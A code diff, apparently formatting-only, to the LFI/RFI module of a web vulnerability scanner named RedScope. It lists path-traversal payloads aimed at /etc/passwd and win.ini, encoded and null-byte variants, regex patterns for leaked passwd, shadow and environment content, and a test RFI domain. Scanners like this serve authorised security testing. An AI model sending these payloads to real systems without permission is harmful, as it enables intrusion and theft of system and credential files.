@@ -1,16 +1,38 @@
 import re
 from typing import List, Optional
-from urllib.parse import urlparse, parse_qs
+from urllib.parse import parse_qs, urlparse
 
 import requests
 
-from core.base_module import BaseModule, ScanResult, Finding
+from core.base_module import BaseModule, Finding, ScanResult
 
 LFI_PARAMS = [
-    "file", "page", "path", "include", "doc", "document", "folder",
-    "root", "dir", "template", "view", "layout", "load", "read",
-    "location", "lang", "language", "module", "conf", "config",
-    "content", "data", "filename", "filepath", "src", "source",
+    "file",
+    "page",
+    "path",
+    "include",
+    "doc",
+    "document",
+    "folder",
+    "root",
+    "dir",
+    "template",
+    "view",
+    "layout",
+    "load",
+    "read",
+    "location",
+    "lang",
+    "language",
+    "module",
+    "conf",
+    "config",
+    "content",
+    "data",
+    "filename",
+    "filepath",
+    "src",
+    "source",
 ]
 
 LFI_PAYLOADS = [
@@ -24,8 +46,8 @@ LFI_PAYLOADS = [
     "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
     "..%252f..%252f..%252fetc%252fpasswd",
     "/etc/passwd",
-    "/etc/passwd%00",          # Null byte (older PHP)
-    "....\/....\/etc/passwd",
+    "/etc/passwd%00",  # Null byte (older PHP)
+    r"....\/....\/etc/passwd",
     # Windows path traversal
     "..\\..\\..\\windows\\win.ini",
     "..%5c..%5c..%5cwindows%5cwin.ini",
@@ -57,14 +79,14 @@ RFI_PAYLOADS = [
 
 # Indicators that LFI succeeded
 LFI_INDICATORS = [
-    (r"root:.*:0:0:",              "Unix /etc/passwd content"),
-    (r"\[extensions\]",            "Windows win.ini content"),
-    (r"daemon:.*:/usr/sbin",       "Unix /etc/passwd content"),
-    (r"DOCUMENT_ROOT=",            "PHP environ leak"),
-    (r"Linux version \d",          "/proc/version leak"),
-    (r"127\.0\.0\.1\s+localhost",  "/etc/hosts leak"),
-    (r"shadow:.*:!",               "/etc/shadow content"),
-    (r"apache|nginx",              "Log file content"),
+    (r"root:.*:0:0:", "Unix /etc/passwd content"),
+    (r"\[extensions\]", "Windows win.ini content"),
+    (r"daemon:.*:/usr/sbin", "Unix /etc/passwd content"),
+    (r"DOCUMENT_ROOT=", "PHP environ leak"),
+    (r"Linux version \d", "/proc/version leak"),
+    (r"127\.0\.0\.1\s+localhost", "/etc/hosts leak"),
+    (r"shadow:.*:!", "/etc/shadow content"),
+    (r"apache|nginx", "Log file content"),
     (r"[a-zA-Z0-9+/]{40,}={0,2}", "Base64 encoded file (PHP wrapper)"),
 ]
 
@@ -74,7 +96,9 @@ RFI_INDICATOR = "evil-redscope-test.com"
 
 class Module(BaseModule):
     name = "lfi"
-    description = "LFI/RFI scanner — path traversal, PHP wrapper, and remote file inclusion"
+    description = (
+        "LFI/RFI scanner — path traversal, PHP wrapper, and remote file inclusion"
+    )
     author = "RedScope"
     version = "1.0.0"
 
@@ -92,7 +116,9 @@ class Module(BaseModule):
         base_url = url.split("?")[0] if existing_params else url
         params_to_test = list(set(existing_params) | set(LFI_PARAMS))
 
-        self.log.info(f"  Testing {len(params_to_test)} params × {len(LFI_PAYLOADS)} LFI payloads")
+        self.log.info(
+            f"  Testing {len(params_to_test)} params × {len(LFI_PAYLOADS)} LFI payloads"
+        )
 
         for param in params_to_test:
             # LFI
@@ -125,8 +151,16 @@ class Module(BaseModule):
 
                 for pattern, label in LFI_INDICATORS:
                     if re.search(pattern, body):
-                        self.log.info(f"  [bold red]LFI CONFIRMED[/] param={param} payload={payload!r} indicator={label}")
-                        severity = "critical" if "passwd" in label or "shadow" in label or "environ" in label else "high"
+                        self.log.info(
+                            f"  [bold red]LFI CONFIRMED[/] param={param} payload={payload!r} indicator={label}"
+                        )
+                        severity = (
+                            "critical"
+                            if "passwd" in label
+                            or "shadow" in label
+                            or "environ" in label
+                            else "high"
+                        )
                         return Finding(
                             title=f"Local File Inclusion — parameter: {param}",
                             severity=severity,
@@ -165,7 +199,9 @@ class Module(BaseModule):
                 if RFI_INDICATOR in resp.text or resp.status_code in (200, 500):
                     # Heuristic: if the external domain appears in response, RFI may be happening
                     if RFI_INDICATOR in resp.text:
-                        self.log.info(f"  [bold red]RFI POSSIBLE[/] param={param} payload={payload!r}")
+                        self.log.info(
+                            f"  [bold red]RFI POSSIBLE[/] param={param} payload={payload!r}"
+                        )
                         return Finding(
                             title=f"Remote File Inclusion — parameter: {param}",
                             severity="critical",
